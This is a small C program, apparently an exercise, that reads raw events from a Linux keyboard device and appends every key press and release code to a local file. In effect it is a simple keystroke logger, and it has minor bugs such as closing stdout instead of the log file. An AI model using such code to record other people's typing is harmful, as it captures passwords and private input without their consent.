#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>

int main(int argc, char *argv[])
{
    FILE * std = fopen("ex2.txt", "a");
    int size = sizeof(struct input_event);
    int fd = open("/dev/input/by-path/platform-i8042-serio-0-event-kbd", O_RDONLY);
    // Convert Stdout to ext2.txt
    FILE * fp;
    struct input_event ev;

    if (fd == -1)
    {
        printf("Cannot open device file /dev/input/by-path/platform-i8042-serio-0-event-kbd\n");
        exit(1);
    }

    while (1)
    {
        int rd = read(fd, &ev, size);
        if (rd == size)
        {
            if (ev.type == EV_KEY)
            {
                if (ev.value == 1)
                {
                    fprintf(std, "PRESSED 0x%04x (%d) \n", ev.code, ev.code);
                }
                else if (ev.value == 0)
                {
                    fprintf(std, "RELEASED 0x%04x (%d) \n", ev.code, ev.code);
                }
            }
        }
    }
    close(fd);
    fclose (stdout);
    return 0;
}
